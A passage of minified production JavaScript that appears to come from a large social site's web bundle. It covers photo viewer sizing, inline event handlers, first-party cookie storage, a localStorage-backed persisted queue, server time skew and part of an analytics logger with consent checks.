      window.devicePixelRatio && window.devicePixelRatio > 1 && (a = new b(a.x * window.devicePixelRatio, a.y * window.devicePixelRatio));
    });
    return a;
  }
  function x(a, b) {
    c("ifRequired")("Vector", function (c) {
      var d = a.x,
        e = a.y;
      if (d >= b.x || e >= b.y) {
        var f = b.x / b.y,
          g = d / e;
        f < g ? (d = b.x, e = Math.round(d / g)) : f > g ? (e = b.y, d = Math.round(e * g)) : (d = b.x, e = b.y);
      }
      return new c(d, e);
    });
  }
  b = function () {
    c("Arbiter").subscribe(c("PageEvents").BIGPIPE_ONLOAD, function () {
      var a = c("getSurfaceAwareContainer")();
      (a && a.classList.contains("home") || a && a.classList.contains("timelineLayout")) && c("ifRequired")("requestIdleCallback", function (a) {
        a(function () {
          r();
        });
      }, function () {
        r();
      });
    });
  };
  g.STAGE_NORMAL_MAX = n;
  g.SIDEBAR_SIZE_MAX = o;
  g.STAGE_CHROME = p;
  g.load = a;
  g.loadWithSnowLift = q;
  g.loadFrame = r;
  g.shouldUseSnowlift = s;
  g.getImageURL = t;
  g.shouldShowHiRes = u;
  g.getStageSize = v;
  g.adjustStageSizeForPixelRatio = w;
  g.getImageSizeInStage = x;
  g.preload = b;
}, 98);
__d("PrimerInlineHandlers", ["Bootloader", "CSS", "Parent", "nullthrows", "uniqueID"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = {},
    i = new Map();
  function j(a, b) {
    var e = c("nullthrows")(a.id);
    e in h || (h[e] = 0);
    h[e] === 0 && d("CSS").addClass(a, "bootloading");
    h[e] += b;
  }
  function k(a) {
    var b = c("nullthrows")(a.id);
    h[b]--;
    h[b] === 0 && d("CSS").removeClass(a, "bootloading");
  }
  function l(a, b, c, d) {
    var e = d !== void 0 ? c[d] : c,
      f;
    if (Array.isArray(e)) for (f = 0; f < e.length; f++) l(a, b, e, f);else if (e && typeof e === "object") if (e.__elem) c[d] = a;else if (e.__event) c[d] = b;else for (f in e) l(a, b, e, f);
  }
  function m(a, b, e) {
    var g = d("Parent").byClass(a, "stat_elem") || a;
    g.id || g.setAttribute("id", c("uniqueID")());
    e = JSON.parse(a.getAttribute(e));
    j(g, e.length);
    e.forEach(function (d) {
      d = Array.isArray(d) ? n(d) : o(d);
      var e = d.moduleName,
        h = d.methodName,
        j = d.logicalKey,
        m = d.args;
      l(a, b, m);
      var p = c("Bootloader").loadModules.call(c("Bootloader"), [e], function (a) {
        k(g), a[h].apply(a, m);
      }, "Primer: addEventHandler");
      if (j != null) {
        d = i.get(j);
        d !== void 0 && d();
        i.set(j, function () {
          p.remove(), k(a);
        });
      }
    });
  }
  function n(a) {
    var b = a[0],
      c = a[1];
    a = a.slice(2);
    return {
      moduleName: b,
      methodName: c,
      args: a
    };
  }
  function o(a) {
    var b = a.k,
      c = a.mod,
      d = a.meth;
    a = a.a;
    return {
      logicalKey: b,
      moduleName: c,
      methodName: d,
      args: a
    };
  }
  function a(a, b, c) {
    a = d("Parent").byAttribute(a, c);
    if (!a) return null;
    do m(a, b, c); while (a = d("Parent").byAttribute(a.parentNode, c));
    return !1;
  }
  g.run = a;
}, 98);
__d("ReactServerPrimer", ["FBLogger", "Parent"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = new Map();
  function i(a) {
    while (a && a instanceof Node) {
      if (a instanceof HTMLElement && a.getAttribute("data-sr-before")) break;
      var b = a.previousSibling;
      b ? a = b : a = a.parentNode;
    }
    if (a instanceof HTMLElement) return a;else {
      c("FBLogger")("ServerCallables").mustfix("Failed to find wrapping data-sr-before mount");
      return null;
    }
  }
  function j(a, b, c) {
    var d = i(b);
    if (!d) return null;
    var e = h.get(d);
    e || (e = [], h.set(d, e));
    e.push(function () {
      var d = new a.constructor(a.type, a),
        e = c === void 0 ? b : c;
      e.dispatchEvent(d);
    });
    return !1;
  }
  function a(a, b, c) {
    a = d("Parent").byAttribute(c, a);
    return !a ? null : j(b, a, c);
  }
  g.handleEvent = a;
}, 98);
__d("clickRefAction", ["Arbiter"], function (a, b, c, d, e, f) {
  var g = function (b, a, c, d, e) {
      "use strict";

      var f = this;
      this.set_namespace = function (a) {
        f.ns = a;
        return f;
      };
      this.coalesce_namespace = function (a) {
        f.ns === null && (f.ns = a);
        return f;
      };
      this.add_event = function () {
        return f;
      };
      var g = b + "/" + a;
      this.ue = g;
      this.ue_ts = b;
      this.ue_count = a;
      this.context = c;
      this.ns = null;
      this.node = d;
      this.type = e;
    },
    h = 0,
    i = [],
    j = Date.now() + 6e4;
  function c(a, c, d, e, f) {
    var k = Date.now(),
      l = d && d.type;
    f = f || {};
    !c && d && (c = d.getTarget());
    var m = 50;
    if (c && e != "FORCE") for (var n = i.length - 1; n >= 0 && k - i[n].ue_ts < m; --n) if (i[n].node == c && i[n].type == l) return i[n];
    n = new g(k, h, a, c, l);
    i.push(n);
    while (i[0].ue_ts + m < k || i.length > 10) i.shift();
    l = k < j ? "persistent" : "event";
    a == "contextmenu" ? b("Arbiter").inform("ClickRefAction/contextmenu", {
      cfa: n,
      node: c,
      mode: e,
      event: d,
      extra_data: f
    }, l) : a == "middleclick" ? b("Arbiter").inform("ClickRefAction/middleclick", {
      cfa: n,
      node: c,
      mode: e,
      event: d,
      extra_data: f
    }, l) : b("Arbiter").inform("ClickRefAction/new", {
      cfa: n,
      node: c,
      mode: e,
      event: d,
      extra_data: f
    }, l);
    h++;
    return n;
  }
  e.exports = a.clickRefAction = c;
}, null);
__d("firstClickTimestamp", ["DataStore"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = "first-click-timestamp";
  function a(a, b) {
    var c = d("DataStore").get(a, h);
    c || d("DataStore").set(a, h, b.toString());
  }
  function b(a) {
    a = d("DataStore").get(a, h);
    return Number(a);
  }
  g.setIfFirstClick = a;
  g.get = b;
}, 98);
__d("RDRequireDeferredReference", ["RequireDeferredReference"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = function (a) {
    babelHelpers.inheritsLoose(b, a);
    function b() {
      return a.apply(this, arguments) || this;
    }
    b.disableForSSR_DO_NOT_USE = function () {
      this.$RDRequireDeferredReference1 = !1;
    };
    var c = b.prototype;
    c.isAvailableInSSR_DO_NOT_USE = function () {
      return this.constructor.$RDRequireDeferredReference1;
    };
    return b;
  }(c("RequireDeferredReference"));
  a.$RDRequireDeferredReference1 = !0;
  g["default"] = a;
}, 98);
__d("requireDeferred", ["RDRequireDeferredReference"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = {};
  function i(a, b) {
    h[a] = b;
  }
  function j(a) {
    return h[a];
  }
  function a(a) {
    var b = j(a);
    if (b) return b;
    b = new (c("RDRequireDeferredReference"))(a);
    i(a, b);
    return b;
  }
  g["default"] = a;
}, 98);
__d("CookieStore", ["CookieCoreLoggingConfig", "FBLogger", "Random", "gkx", "performanceNow"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = window.I_AM_CORE_COOKIE_INFRASTRUCTURE_AND_NEED_TO_ACCESS_COOKIES != null ? window.I_AM_CORE_COOKIE_INFRASTRUCTURE_AND_NEED_TO_ACCESS_COOKIES() : null,
    i = {
      set: function (a) {
        document.cookie = a;
      },
      get: function () {
        return document.cookie;
      }
    };
  function j() {
    return h != null ? h : i;
  }
  function k(a, b, c, d, e, f, g, h) {
    return b + "=" + encodeURIComponent(c) + "; " + (f !== 0 && f !== void 0 && f !== null ? "expires=" + new Date(a + f).toUTCString() + "; " : "") + "path=" + d + "; domain=" + e + (g ? "; secure" : "") + (h ? "; SameSite=" + h : "");
  }
  function l(a, b, c) {
    return a + "=; expires=Thu, 01-Jan-1970 00:00:01 GMT; path=" + b + "; domain=" + c;
  }
  function m() {
    if (c("CookieCoreLoggingConfig").sampleRate > 0) {
      var a = c("performanceNow")(),
        b = j().get();
      a = c("performanceNow")() - a;
      var d = a > c("CookieCoreLoggingConfig").maximumIgnorableStallMs && c("Random").coinflip(1 / c("CookieCoreLoggingConfig").sampleRate);
      d && c("FBLogger")("cookie_infra").addMetadata("COOKIE_INFRA", "WALL_TIME", String(a)).warn("Cookie read exceeded %s milliseconds.", c("CookieCoreLoggingConfig").maximumIgnorableStallMs);
      return b;
    } else return j().get();
  }
  var n = function () {
      function a() {
        this.$1 = 0;
      }
      var b = a.prototype;
      b.setCookie = function (a, b, c, d, e, f, g, h) {
        j().set(k(a, b, c, d, e, f, g, h));
      };
      b.clearCookie = function (a, b, c) {
        j().set(l(a, b, c));
      };
      b.getCookie = function (a) {
        var b;
        this.$1++;
        b = (b = m()) == null ? void 0 : b.match("(?:^|;\\s*)" + a + "=(.*?)(?:;|$)");
        return b ? decodeURIComponent(b[1]) : null;
      };
      return a;
    }(),
    o = 10 * 1e3,
    p = function () {
      function a() {
        this.$1 = {}, this.$2 = 0, this.$3 = 0, this.$4 = 0;
      }
      var b = a.prototype;
      b.setCookie = function (a, b, c, d, e, f, g, h) {
        j().set(k(a, b, c, d, e, f, g, h)), this.$1[b] = {
          value: c,
          updated: a
        };
      };
      b.clearCookie = function (a, b, c) {
        j().set(l(a, b, c)), this.$1[a] = {
          value: null,
          updated: Date.now()
        };
      };
      b.getCookie = function (a) {
        a = this.$5(a);
        a = a.cookie;
        return a;
      };
      b.$5 = function (a) {
        var b = Date.now(),
          c = this.$1[a];
        if (!c) {
          if (this.$2 + o < b) {
            this.$6();
            return {
              cookie: this.$5(a).cookie,
              hit: !1
            };
          }
          this.$3++;
          return {
            cookie: null,
            hit: !0
          };
        }
        if (c.updated + o < b) {
          this.$6();
          return {
            cookie: this.$5(a).cookie,
            hit: !1
          };
        }
        this.$3++;
        return {
          cookie: c.value,
          hit: !0
        };
      };
      b.$6 = function () {
        var a;
        this.$4++;
        a = (a = (a = m()) == null ? void 0 : a.split(";")) != null ? a : [];
        this.$2 = Date.now();
        this.$1 = {};
        for (var a = a, b = Array.isArray(a), c = 0, a = b ? a : a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
          var d;
          if (b) {
            if (c >= a.length) break;
            d = a[c++];
          } else {
            c = a.next();
            if (c.done) break;
            d = c.value;
          }
          d = d;
          d = d.match("\\s*([^=]+)=(.*)");
          if (!d) continue;
          this.$1[d[1]] = {
            value: decodeURIComponent(d[2]),
            updated: this.$2
          };
        }
      };
      return a;
    }();
  function a() {
    return c("gkx")("676837") ? new p() : new n();
  }
  g.newCookieStore = a;
  g.CookieCacheForTest = p;
  g.CookieStoreSlowForTest = n;
}, 98);
__d("CookieCore", ["CookieCoreConfig", "CookieDomain", "CookieStore"], function (a, b, c, d, e, f, g) {
  var h = /_js_(.*)/,
    i;
  function j() {
    i || (i = d("CookieStore").newCookieStore());
    return i;
  }
  function k() {
    return "." + c("CookieDomain").domain;
  }
  function l(a) {
    return window.self !== window.top ? !1 : !0;
  }
  function m(a, b) {
    if (!r(a)) return;
    n(a, b, t(a), u(a), s(a), v(a));
  }
  function a(a, b, c) {
    if (!r(a)) return;
    n(a, b, t(a), u(a), s(a), v(a), c);
  }
  function n(a, b, c, d, e, f, g) {
    var h = Date.now();
    if (c != null) if (c > h) c -= h;else if (c === 1) {
      o(a, d, g);
      return;
    }
    j().setCookie(h, a, b, d, (h = g) != null ? h : k(), c, e, f);
  }
  function b(a, b) {
    if (!l(a)) return;
    m(a, b);
  }
  function e(a, b, c, d, e, f) {
    if (!l(a)) return;
    n(a, b, c, d, e, null, f);
  }
  function o(a, b, c) {
    b === void 0 && (b = "/");
    b = b || "/";
    j().clearCookie(a, b, (a = c) != null ? a : k());
  }
  function f(a) {
    return !r(a) ? null : j().getCookie(a);
  }
  function p(a) {
    return {
      insecure: a.i || !1,
      path: a.p || "/",
      ttlSeconds: a.t || 0,
      sameSite: a.s || "None"
    };
  }
  function q(a) {
    if (c("CookieCoreConfig")[a] !== void 0) return p(c("CookieCoreConfig")[a]);
    a = a.match(h);
    return a && a.length > 1 ? q(a[1]) : null;
  }
  function r(a) {
    return q(a) !== null;
  }
  function s(a) {
    a = q(a);
    return a == null ? !0 : !a.insecure;
  }
  function t(a) {
    a = q(a);
    return a == null ? null : a.ttlSeconds * 1e3;
  }
  function u(a) {
    a = q(a);
    return a == null ? "/" : a.path;
  }
  function v(a) {
    a = q(a);
    return a == null || a.sameSite == null ? null : a.sameSite;
  }
  g.set = m;
  g.setWithDomain_FOR_MESSENGER_LS_ONLY = a;
  g.setWithoutChecks = n;
  g.setIfFirstPartyContext = b;
  g.setWithoutChecksIfFirstPartyContext = e;
  g.clear = o;
  g.get = f;
}, 98);
__d("OdsWebBatchFalcoEvent", ["FalcoLoggerInternal", "getFalcoLogPolicy_DO_NOT_USE"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = c("getFalcoLogPolicy_DO_NOT_USE")("1838142");
  b = d("FalcoLoggerInternal").create("ods_web_batch", a);
  e = b;
  g["default"] = e;
}, 98);
__d("FalcoConsentChecker", [], function (a, b, c, d, e, f) {
  "use strict";

  function g(a, b, c, d) {
    var e;
    switch (typeof d) {
      case "string":
        e = a[String(d)];
        return !e ? !1 : e <= b;
      case "number":
        return g(a, b, c, c[Number(d)]);
      default:
        e = !1;
        if (Array.isArray(d)) {
          var f = d[0];
          for (var h = 1; h < d.length; h++) {
            e = g(a, b, c, d[h]);
            if (e) {
              if (f === "or") return !0;
            } else if (f === "and") return !1;
          }
        }
        return e;
    }
  }
  f["default"] = g;
}, 66);
__d("FalcoUtils", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    if (a) {
      var b = a.fbIdentity,
        c = a.appScopedIdentity;
      a = a.claim;
      var d = "";
      if (b) {
        var e = b.accountId;
        b = b.actorId;
        d = e + "^#" + b + "^#";
      } else c !== void 0 && (d = "^#^#" + c);
      return d + "^#" + a;
    }
    return "";
  }
  f.identityToString = a;
}, 66);
__d("FBJSON", [], function (a, b, c, d, e, f) {
  a = JSON.parse;
  b = JSON.stringify;
  f.parse = a;
  f.stringify = b;
}, 66);
__d("Run", ["cr:925100"], function (a, b, c, d, e, f, g) {
  "use strict";

  g.__domContentCallback = (a = b("cr:925100")).__domContentCallback;
  g.__onloadCallback = a.__onloadCallback;
  g.__removeHook = a.__removeHook;
  g.onAfterLoad = a.onAfterLoad;
  g.onAfterUnload = a.onAfterUnload;
  g.onBeforeUnload = a.onBeforeUnload;
  g.maybeOnBeforeUnload = a.maybeOnBeforeUnload;
  g.onCleanupOrLeave = a.onCleanupOrLeave;
  g.onLeave = a.onLeave;
  g.onLoad = a.onLoad;
  g.onUnload = a.onUnload;
}, 98);
__d("pageID", ["WebSession"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = d("WebSession").getPageId_DO_NOT_USE();
  g["default"] = a;
}, 98);
__d("WebStorageMutex", ["WebStorage", "clearTimeout", "pageID", "setTimeout"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = null,
    i = !1,
    j = c("pageID");
  function k() {
    i || (i = !0, h = c("WebStorage").getLocalStorage());
    return h;
  }
  a = function () {
    function a(a) {
      this.name = a;
    }
    a.testSetPageID = function (a) {
      j = a;
    };
    var b = a.prototype;
    b.$2 = function () {
      var a,
        b = k();
      if (!b) return j;
      b = b.getItem("mutex_" + this.name);
      b = ((a = b) != null ? a : "").split(":");
      return b && parseInt(b[1], 10) >= Date.now() ? b[0] : null;
    };
    b.$3 = function (a) {
      var b = k();
      if (!b) return;
      a = a == null ? 1e3 : a;
      a = Date.now() + a;
      c("WebStorage").setItemGuarded(b, "mutex_" + this.name, j + ":" + a);
    };
    b.hasLock = function () {
      return this.$2() === j;
    };
    b.lock = function (a, b, d) {
      var e = this;
      this.$1 && c("clearTimeout")(this.$1);
      j === (this.$2() || j) && this.$3(d);
      this.$1 = c("setTimeout")(function () {
        e.$1 = null;
        var c = e.hasLock() ? a : b;
        c && c(e);
      }, 0);
    };
    b.unlock = function () {
      this.$1 && c("clearTimeout")(this.$1);
      var a = k();
      a && this.hasLock() && a.removeItem("mutex_" + this.name);
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("guid", [], function (a, b, c, d, e, f) {
  function a() {
    return "f" + (Math.random() * (1 << 30)).toString(16).replace(".", "");
  }
  f["default"] = a;
}, 66);
__d("TimerStorage", [], function (a, b, c, d, e, f) {
  a = {
    ANIMATION_FRAME: "ANIMATION_FRAME",
    IDLE_CALLBACK: "IDLE_CALLBACK",
    IMMEDIATE: "IMMEDIATE",
    INTERVAL: "INTERVAL",
    TIMEOUT: "TIMEOUT"
  };
  var g = {};
  Object.keys(a).forEach(function (a) {
    return g[a] = {};
  });
  b = babelHelpers["extends"]({}, a, {
    set: function (a, b) {
      g[a][b] = !0;
    },
    unset: function (a, b) {
      delete g[a][b];
    },
    clearAll: function (a, b) {
      Object.keys(g[a]).forEach(b), g[a] = {};
    },
    getStorages: function () {
      return {};
    }
  });
  c = b;
  f["default"] = c;
}, 66);
__d("requestAnimationFrame", ["TimeSlice", "TimerStorage", "requestAnimationFrameAcrossTransitions"], function (a, b, c, d, e, f, g) {
  function a(a) {
    function b(b) {
      c("TimerStorage").unset(c("TimerStorage").ANIMATION_FRAME, d), a(b);
    }
    c("TimeSlice").copyGuardForWrapper(a, b);
    b.__originalCallback = a;
    var d = c("requestAnimationFrameAcrossTransitions")(b);
    c("TimerStorage").set(c("TimerStorage").ANIMATION_FRAME, d);
    return d;
  }
  g["default"] = a;
}, 98);
__d("PersistedQueue", ["AnalyticsCoreData", "BaseEventEmitter", "ExecutionEnvironment", "FBJSON", "Run", "WebStorage", "WebStorageMutex", "err", "guid", "nullthrows", "performanceAbsoluteNow", "requestAnimationFrame"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = 24 * 60 * 60 * 1e3,
    i = 30 * 1e3,
    j = new (c("BaseEventEmitter"))(),
    k;
  function l(a) {
    a === void 0 && (a = !1);
    if (k === void 0) {
      var b;
      if (((b = c("AnalyticsCoreData").queue_activation_experiment) != null ? b : !1) && a) try {
        return c("WebStorage").getLocalStorageForRead();
      } catch (a) {
        return null;
      }
      b = "check_quota";
      try {
        a = c("WebStorage").getLocalStorage();
        a ? (a.setItem(b, b), a.removeItem(b), k = a) : k = null;
      } catch (a) {
        k = null;
      }
    }
    return k;
  }
  function m(a) {
    var b = a.prev,
      c = a.next;
    c && (c.prev = b);
    b && (b.next = c);
    a.next = null;
    a.prev = null;
  }
  function n(a) {
    return {
      item: a,
      next: null,
      prev: null
    };
  }
  function o(a, b) {
    return a + "^$" + ((a = b == null ? void 0 : b.queueNameSuffix) != null ? a : "");
  }
  var p = {},
    q = {},
    r = {},
    s = !1;
  a = function () {
    function a(a, b) {
      var d,
        e = this;
      this.$7 = 0;
      this.$3 = a;
      this.$5 = (d = b == null ? void 0 : b.queueNameSuffix) != null ? d : "";
      this.$15 = b == null ? void 0 : b.application;
      this.$4 = o(a, b);
      this.$11 = this.$4 + "^$" + c("guid")();
      this.$14 = !1;
      if (b) {
        this.$8 = (d = b.max_age_in_ms) != null ? d : h;
        this.$12 = b.migrate;
        this.$13 = b.onLoad;
      } else this.$8 = h;
      this.$9 = [j.addListener("active", function () {
        (e.$10 != null || !e.$14) && (e.$14 = !0, e.$10 = null, e.$16());
      }), j.addListener("inactive", function () {
        e.$10 == null && (e.$10 = Date.now(), e.$17());
      })];
      (c("ExecutionEnvironment").canUseDOM || c("ExecutionEnvironment").isInWorker) && c("requestAnimationFrame")(function () {
        return e.$16();
      });
    }
    var b = a.prototype;
    b.isActive = function () {
      var a = this.$10;
      if (a == null) return !0;
      if (Date.now() - a > i) {
        this.$10 = null;
        j.emit("active", null);
        return !0;
      }
      return !1;
    };
    b.$16 = function () {
      this.$18(), this.$19();
    };
    b.$17 = function () {
      this.$20();
    };
    b.getFullName = function () {
      return this.$4;
    };
    b.getQueueNameSuffix = function () {
      return this.$5;
    };
    a.isQueueActivateExperiment = function () {
      return s;
    };
    a.setOnQueueActivateExperiment = function () {
      s = !0;
    };
    a.create = function (b, d) {
      var e = o(b, d);
      if (e in p) throw c("err")("Duplicate queue created: " + b);
      d = new a(b, d);
      p[e] = d;
      r[b] ? r[b].push(d) : r[b] = [d];
      e = q[b];
      e && d.setHandler(e);
      return d;
    };
    a.setHandler = function (a, b) {
      if (r[a]) {
        var c = r[a];
        for (var c = c, d = Array.isArray(c), e = 0, c = d ? c : c[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
          var f;
          if (d) {
            if (e >= c.length) break;
            f = c[e++];
          } else {
            e = c.next();
            if (e.done) break;
            f = e.value;
          }
          f = f;
          f.setHandler(b);
        }
      }
      q[a] = b;
    };
    b.destroy = function () {
      this.$9.forEach(function (a) {
        return a.remove();
      });
    };
    a.destroy = function (a, b) {
      a = o(a, b);
      p[a].destroy();
      delete p[a];
    };
    b.setHandler = function (a) {
      this.$6 = a;
      this.$19();
      return this;
    };
    b.$19 = function () {
      this.$7 > 0 && this.$6 && this.$6(this);
    };
    b.length = function () {
      return this.$7;
    };
    b.enumeratedLength = function () {
      return this.$21().length;
    };
    a.isPersistenceAllowed = function () {
      var a = l();
      return !a ? !1 : !0;
    };
    a.getSuffixesForKey = function (a) {
      var b = [];
      try {
        var c = l(!0);
        if (!c) return b;
        a = a + "^$";
        for (var d = 0; d < c.length; d++) {
          var e = c.key(d);
          if (typeof e === "string" && e.startsWith("mutex_falco_")) c.removeItem(e);else if (typeof e === "string" && e.startsWith(a)) {
            e = e.split("^$");
            if (e.length > 2) {
              e = e[1];
              b.push(e);
            } else b.push("");
          }
        }
      } catch (a) {}
      return b;
    };
    b.$18 = function () {
      var b,
        e = this,
        a = l(!0);
      if (!a) return;
      var f = this.$4 + "^$";
      b = new (c("WebStorageMutex"))((b = this.$15) != null ? b : f);
      var g = this.$12,
        h = this.$13;
      b.lock(function (b) {
        var i = Date.now() - e.$8;
        try {
          for (var j = 0; j < a.length; j++) {
            var k = a.key(j);
            if (typeof k === "string" && k.startsWith(f)) {
              var l = a.getItem(k);
              a.removeItem(k);
              if (l != null && l.startsWith("{")) {
                k = d("FBJSON").parse(c("nullthrows")(l));
                if (k.ts > i) try {
                  for (var l = k.items, k = Array.isArray(l), m = 0, l = k ? l : l[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
                    var n;
                    if (k) {
                      if (m >= l.length) break;
                      n = l[m++];
                    } else {
                      m = l.next();
                      if (m.done) break;
                      n = m.value;
                    }
                    n = n;
                    g != null ? g(n) : n;
                    n = h != null ? h(n) : n;
                    e.$22(n);
                  }
                } catch (a) {}
              }
            }
          }
        } catch (a) {}
        b.unlock();
        e.$19();
      });
    };
    b.$20 = function () {
      var a = l();
      if (!a) return;
      var b = this.$21();
      if (b.length === 0) {
        a.getItem(this.$11) != null && a.removeItem(this.$11);
        return;
      }
      c("WebStorage").setItemGuarded(a, this.$11, d("FBJSON").stringify({
        items: b.map(function (a) {
          return a;
        }),
        ts: c("performanceAbsoluteNow")()
      }));
    };
    b.$21 = function () {
      var a = this.$1,
        b = [];
      if (!a) return b;
      do b.push(a.item); while (a = a.prev);
      return b.reverse();
    };
    b.markItemAsCompleted = function (a) {
      var b = a.prev;
      m(a);
      this.$1 === a && (this.$1 = b);
      this.$7--;
      this.isActive() || this.$20();
    };
    b.markItemAsFailed = function (a) {
      m(a);
      var b = this.$2;
      if (b) {
        var c = b.prev;
        c && (c.next = a, a.prev = c);
        a.next = b;
        b.prev = a;
      }
      this.$2 = a;
      this.isActive() && this.$19();
    };
    b.markItem = function (a, b) {
      b ? this.markItemAsCompleted(a) : this.markItemAsFailed(a);
    };
    b.$22 = function (a) {
      a = n(a);
      var b = this.$1;
      b && (b.next = a, a.prev = b);
      this.$1 = a;
      this.$2 || (this.$2 = a);
      this.$7++;
    };
    b.wrapAndEnqueueItem = function (a) {
      this.$22(a), this.isActive() ? this.$19() : this.$20();
    };
    b.dequeueItem = function () {
      if (this.$10 != null) return null;
      var a = this.$2;
      if (!a) return null;
      this.$2 = a.next;
      return a;
    };
    return a;
  }();
  a.eventEmitter = j;
  if (c("ExecutionEnvironment").canUseDOM) {
    var t = d("Run").maybeOnBeforeUnload(function () {
      j.emit("inactive", null), t == null ? void 0 : t.remove();
    }, !1);
    if (!t) var u = d("Run").onUnload(function () {
      j.emit("inactive", null), u.remove();
    });
  }
  g["default"] = a;
}, 98);
__d("ServerTime", ["ServerTimeData"], function (a, b, c, d, e, f, g) {
  var h,
    i = 0;
  f = 0;
  var j = null;
  h = (h = (typeof window !== "undefined" ? window : self).performance) == null ? void 0 : h.timing;
  if (h) {
    var k = h.requestStart;
    h = h.domLoading;
    if (k && h) {
      var l = c("ServerTimeData").timeOfResponseStart - c("ServerTimeData").timeOfRequestStart;
      k = h - k - l;
      f = k / 2;
      l = h - c("ServerTimeData").timeOfResponseStart - f;
      h = Math.max(50, k * .8);
      Math.abs(l) > h && (i = l, j = Date.now());
    }
  } else d(c("ServerTimeData").serverTime);
  function a() {
    return Date.now() - i;
  }
  function b() {
    return i;
  }
  function d(a) {
    a = Date.now() - a;
    Math.abs(i - a) > 6e4 && (i = a, j = Date.now());
  }
  function e() {
    return j === null ? null : Date.now() - j;
  }
  f = a;
  k = b;
  g.getMillis = a;
  g.getOffsetMillis = b;
  g.update = d;
  g.getMillisSinceLastUpdate = e;
  g.get = f;
  g.getSkew = k;
}, 98);
__d("FalcoLoggerInternal", ["AnalyticsCoreData", "BaseEventEmitter", "FBLogger", "FalcoConsentChecker", "FalcoUtils", "ODS", "PersistedQueue", "Promise", "Random", "ServerTime", "nullthrows", "performanceAbsoluteNow"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a) {
    return a > 30 ? [1 << a - 30, 0] : [0, 1 << a];
  }
  function h(a, b) {
    return [a[0] | b[0], b[1] | b[1]];
  }
  var i = a(33),
    j = 500 * 1024 * .6,
    k = "ods_web_batch",
    l = new Map(),
    m = new Set(["cmcd_messenger_web_logging_event", "javascript_web_error", "comet_redblock"]);
  function n(a) {
    var b;
    a.tags = h((b = a.tags) != null ? b : [0, 0], i);
    return a;
  }
  function e(a, b) {
    var d;
    d = (d = c("PersistedQueue").getSuffixesForKey(a)) != null ? d : [];
    d.push(b);
    for (var d = d, e = Array.isArray(d), f = 0, d = e ? d : d[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
      var g, h;
      if (e) {
        if (f >= d.length) break;
        h = d[f++];
      } else {
        f = d.next();
        if (f.done) break;
        h = f.value;
      }
      h = h;
      var i = a + "^$" + h;
      if (l.has(i)) continue;
      g = ((g = c("AnalyticsCoreData").use_falco_as_mutex_key) != null ? g : !1) ? c("PersistedQueue").create(a, {
        onLoad: n,
        queueNameSuffix: h,
        application: "falco"
      }) : c("PersistedQueue").create(a, {
        onLoad: n,
        queueNameSuffix: h
      });
      l.set(i, g);
    }
    return c("nullthrows")(l.get(a + "^$" + b));
  }
  a = d("FalcoUtils").identityToString(c("AnalyticsCoreData").identity);
  var o = e("falco_queue_log", a),
    p = e("falco_queue_immediately", a),
    q = e("falco_queue_critical", a),
    r = new (c("BaseEventEmitter"))(),
    s = new (c("BaseEventEmitter"))();
  function t(a, b) {
    d("ODS").bumpEntityKey(1344, "falco.fabric.www." + c("AnalyticsCoreData").push_phase, a, b);
  }
  function u(a, b, e, f) {
    if (a === k) return;
    d("ODS").bumpEntityKey(1344, "falco.event." + a + "." + c("AnalyticsCoreData").push_phase, b, e);
    f && t(b, e);
  }
  var v = {};
  function w(a, b) {
    var d = c("Random").coinflip(b.r);
    b = b.c;
    b != null && c("AnalyticsCoreData").consents != null && (d = d && x(b, c("AnalyticsCoreData").consents, a));
    return d;
  }
  function x(a, b, d) {
    var e = v[a];
    e == null && (e = v[a] = JSON.parse(a));
    return c("FalcoConsentChecker")(b, d, e, e[0]);
  }
  function y() {
    return c("performanceAbsoluteNow")() - d("ServerTime").getOffsetMillis();
  }
  function z(a, b, d, e, f, g) {
    A(a, b, d, e, f, g);
    if (c("AnalyticsCoreData").enable_observer) {
      a = babelHelpers["extends"]({
        name: a,
        time: b,
        sampled: d,
        getData: f,
        policy: e
      }, g && {
        getPrivacyContext: g
      });
      r.emit("event", a);
    }
  }
  function A(a, b, d, e, f, g) {
    if (c("AnalyticsCoreData").enable_cmcd_observer && !m.has(a)) {
      a = babelHelpers["extends"]({
        name: a,
        time: b,
        sampled: d,
        getData: f,
        policy: e
      }, g && {
        getPrivacyContext: g
      });
      s.emit("cmcd_detection_event", a);
    }
  }
  function B(a, b, d, e, f, g) {
    f = JSON.stringify(f);
    if (f.length > j) {
      u(a, "js.drop.oversized_message", 1, !0);
      c("FBLogger")("falco", "oversized_message:" + a).warn('Dropping event "%s" due to exceeding the max size %s at %s', a, j, f.length);
      return;
    }
    g.wrapAndEnqueueItem({
      name: a,
      policy: b,
      time: d,
      extra: f,
      privacyContext: e
    });
    u(a, "js.event.write_to_queue", 1, !0);
  }
  function C(a, b, c, d, e) {
    try {
      var f = y(),
        g = w(f, b);
      if (g) {
        var h = d(),
          i = c && c();
        B(a, b, f, i, h, e);
      }
      z(a, f, g, b, d, c);
    } catch (a) {
      E(a);
    }
  }
  function D(a, c, d, e, f) {
    try {
      var g = y(),
        h = w(g, c);
      if (h) {
        var i = e(),
          j = b("Promise").resolve(d && d());
        return b("Promise").all([i, j]).then(function (b) {
          var d = b[0],
            e = b[1];
          B(a, c, g, e, d, f);
          z(a, g, h, c, function () {
            return d;
          }, e && function () {
            return e;
          });
        });
      } else {
        z(a, g, h, c, e, d);
        return b("Promise").resolve();
      }
    } catch (a) {
      return b("Promise").reject(a);
    }
  }
  function E(a) {
    var b = c("FBLogger")("falco");
    a instanceof Error ? b.catching(a).warn("Error while attempting to log to Falco") : b.warn("Caught non-error while attempting to log to Falco: %s", JSON.stringify(a));
  }
  function f(a, b) {
    return {
      log: function (c, d) {
        C(a, b, d, c, o);
      },
